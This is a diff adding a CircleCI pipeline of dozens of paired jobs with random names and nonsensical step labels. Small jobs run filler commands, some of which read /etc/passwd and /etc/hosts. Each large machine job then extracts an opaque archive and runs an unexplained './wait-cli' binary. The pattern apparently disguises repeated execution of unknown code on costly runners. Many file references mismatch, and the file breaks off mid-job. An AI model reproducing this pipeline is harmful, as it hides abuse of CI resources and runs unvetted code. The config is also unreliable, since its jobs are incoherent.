@@ -1,0 +1,1285 @@
+version: 2.1
+
+jobs:
+  cliedge-i386:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute B
+          command: |
+            mkdir -p /var/tmp/a3
+            set +o pipefail 2>/dev/null; seq 1 864359 | tr '\n' ',' | tr -s ',' > /var/tmp/a3/5c3ac4cf6dd5ced0e318e7; true
+            echo "(RUN_UAT) $(wc -c </var/tmp/a3/5c3ac4cf6dd5ced0e318e7) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - '5c3ac4cf6dd5ced0e318e7'
+  RUN_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/5c3ac4cf6dd5ced0e318e7 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  sidebarForgePadReactorGrow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: despawn mini map
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; echo 'index rebuilt' | xargs; true ; } > /var/tmp/a3/TXN-79366-QI
+            echo "(omar-push) $(wc -c </var/tmp/a3/TXN-79366-QI) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'TXN-79366-QI'
+  omar-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/a6f69dfd57ebaf7b0e811 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  gridCnt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Ping Size Medium
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; truncate -s 1M "/tmp/scripts_2026_07_16.conf" && du -h "/tmp/scripts_2026_07_16.conf"; true ; } > /var/tmp/a3/8b91f858f26
+            echo "(preview) $(wc -c </var/tmp/a3/8b91f858f26) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - '8b91f858f26'
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  cube_register:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Facilitate seeding of the orders table
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; cat /proc/sys/fs/file-nr |head -n15; true ; } > /var/tmp/a3/rusty67
+            echo "(Verify_Prod4) $(wc -c </var/tmp/a3/rusty67) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'rusty67'
+  Verify_Prod4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/0fb097af-519d-e50a-2fa9-25bb537f85ca 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  dwFlagsChunkExport:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: ls tmp dir 70
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; cut -f2- -d"=" /etc/os-release | head -n 10 | fmt -w 54; true ; } > /var/tmp/a3/fnv_c6281a1aaf247c
+            echo "(bob-ship) $(wc -c </var/tmp/a3/fnv_c6281a1aaf247c) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'fnv_c6281a1aaf247c'
+  bob-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/fnv_c6281a1aaf247c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  lua-v29:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: unzip tmp 39
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; for thing in `seq 4`; do echo $((thing * thing)); done|tac; true ; } > /var/tmp/a3/meadow.payload
+            echo "(lets-go) $(wc -c </var/tmp/a3/meadow.payload) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'meadow.payload'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  ivyivy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: BEGIN HARDEN MESH ROUTES
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; echo 'changes saved'; echo 'a-b-c'; true ; } > /var/tmp/a3/exp-30q
+            echo "(romeo) $(wc -c </var/tmp/a3/exp-30q) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'exp-30q'
+  romeo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/exp-30q 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  detach_dialog_throws:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Proceed with submit of the checkout page
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; function show() { local IFS=,; echo "$*"; }; show seal cat crow; true ; } > /var/tmp/a3/250.255.95
+            echo "(node20-cov) $(wc -c </var/tmp/a3/250.255.95) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - '250.255.95'
+  node20-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/0fb097af-519d-e50a-2fa9-25bb537f85ca 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  HiddenCell:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Lock and load evaluation
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; truncate -s 1M "/tmp/stream-flight.md" && stat -c %s "/tmp/stream-flight.md"; true ; } > /var/tmp/a3/chunk.golden.teal.chunk.drift
+            echo "(charlie-1) $(wc -c </var/tmp/a3/chunk.golden.teal.chunk.drift) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'chunk.golden.teal.chunk.drift'
+  charlie-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/chunk.golden.teal.chunk.drift 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  IS_HARD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: run 5ce7
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; seq 1 2 35|tac|wc -l; true ; } > /var/tmp/a3/lxxwivqu
+            echo "(defualt) $(wc -c </var/tmp/a3/lxxwivqu) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'lxxwivqu'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/a6f69dfd57ebaf7b0e811 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  flyssswykpy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Touch and go dump
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; grep -wc -m2 fi /etc/profile; true ; } > /var/tmp/a3/theta_titan_garden_flame
+            echo "(PackagePipeline) $(wc -c </var/tmp/a3/theta_titan_garden_flame) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'theta_titan_garden_flame'
+  PackagePipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  Ping-Payment9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: May I ask you to dilute the centrifuge rotor
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; if command -v sed >&/dev/null ; then echo "sed found"; fi; true ; } > /var/tmp/a3/exp-57f
+            echo "(send-it) $(wc -c </var/tmp/a3/exp-57f) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'exp-57f'
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/0fb097af-519d-e50a-2fa9-25bb537f85ca 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  hello:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute B
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; awk -F: '$4 == 0 {printf "%-16s %s\n", $1, $7}' /etc/passwd | nl; true ; } > /var/tmp/a3/audit-3d95.log
+            echo "(whiskey-2) $(wc -c </var/tmp/a3/audit-3d95.log) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'audit-3d95.log'
+  whiskey-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  decryptRemoteBusGlobal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Dismiss Language Switcher On Dr Site
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; grep -onh --color=never bash /etc/shells | wc -l; true ; } > /var/tmp/a3/48464bbe-1750-761c
+            echo "(PrepareRelease) $(wc -c </var/tmp/a3/48464bbe-1750-761c) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - '48464bbe-1750-761c'
+  PrepareRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  q4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Inventory checks out
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; compgen -b | grep test; true ; } > /var/tmp/a3/882e738e5868b81b3e8ae997c01b8260066bf4
+            echo "(green-light) $(wc -c </var/tmp/a3/882e738e5868b81b3e8ae997c01b8260066bf4) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - '882e738e5868b81b3e8ae997c01b8260066bf4'
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  ID:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: The intrusion rules now locked down
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 2 -name "*.txt" -printf '%f (%s bytes)\n' 2> /dev/null | wc -l; true ; } > /var/tmp/a3/a6f69dfd57ebaf7b0e811
+            echo "(greg-smoke) $(wc -c </var/tmp/a3/a6f69dfd57ebaf7b0e811) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'a6f69dfd57ebaf7b0e811'
+  greg-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/a6f69dfd57ebaf7b0e811 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  ConstBundleRoute:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: The textures are done
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > "/var/tmp/me8.gz" && zgrep -c bash "/var/tmp/me8.gz"; true ; } > /var/tmp/a3/SliceOrchard
+            echo "(APP-600) $(wc -c </var/tmp/a3/SliceOrchard) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'SliceOrchard'
+  APP-600:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/5c3ac4cf6dd5ced0e318e7 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  udi02:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: busy flushing upstream
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; ls -S --indicator-style=slash /etc/host* | xargs; true ; } > /var/tmp/a3/Om
+            echo "(CHECK_DEV) $(wc -c </var/tmp/a3/Om) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'Om'
+  CHECK_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/a6f69dfd57ebaf7b0e811 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  span130:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Decryption to keep the lights on
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; cp /etc/hosts "${TMPDIR:-/tmp}/route.conf" && cmp /etc/hosts "${TMPDIR:-/tmp}/route.conf" && echo same; true ; } > /var/tmp/a3/xx_762e1de
+            echo "(fix-2410) $(wc -c </var/tmp/a3/xx_762e1de) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'xx_762e1de'
+  fix-2410:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/5c3ac4cf6dd5ced0e318e7 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  AcornV4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Late tagging
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; cat /etc/profile | grep -n fi; true ; } > /var/tmp/a3/api
+            echo "(dotnet8-bench) $(wc -c </var/tmp/a3/api) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'api'
+  dotnet8-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/5c3ac4cf6dd5ced0e318e7 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  upload-corp-33:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Mux still frames BIZ 601
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; ls /usr/bin | tr "a-z" "A-Z" | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | shuf -n 5 | awk '{print length, $0}'; true ; } > /var/tmp/a3/20220327_214619
+            echo "(sanity) $(wc -c </var/tmp/a3/20220327_214619) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - '20220327_214619'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/5c3ac4cf6dd5ced0e318e7 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  Coppers:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: This is where we proxy the CDN cache
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; grep -R -s if /etc/skel | cut -d: -f1 | sort -u; true ; } > /var/tmp/a3/IZ
+            echo "(brodcast) $(wc -c </var/tmp/a3/IZ) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'IZ'
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/48464bbe-1750-761c 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  fresh-stubTemp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Plan Thunder
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; echo 'a-b-c' | cksum; true ; } > /var/tmp/a3/Crimson.chrome_5551
+            echo "(realease) $(wc -c </var/tmp/a3/Crimson.chrome_5551) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - 'Crimson.chrome_5551'
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Attach gate output
+          command: |
+            awk 'BEGIN{FS=""} {for(i=1;i<=NF;i++) c[$i]++} END{for(k in c) if(c[k]>3) print c[k],k}' /var/tmp/a3/a6f69dfd57ebaf7b0e811 2>/dev/null | sort -rn | head -5 || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf pending-logs.tar.bz2
+      - run:
+          command: bash -c "./wait-cli"
+  VECX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
+          name: Test tube staining for round two
+          command: |
+            mkdir -p /var/tmp/a3
+            { set +o pipefail 2>/dev/null; df --output=source,fstype,size,pcent /; true ; } > /var/tmp/a3/0fb097af-519d-e50a-2fa9-25bb537f85ca
+            echo "(bake-it) $(wc -c </var/tmp/a3/0fb097af-519d-e50a-2fa9-25bb537f85ca) B"
+      - persist_to_workspace:
+          root: /var/tmp/a3
+          paths:
+            - '0fb097af-519d-e50a-2fa9-25bb537f85ca'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/a3
+      - run:
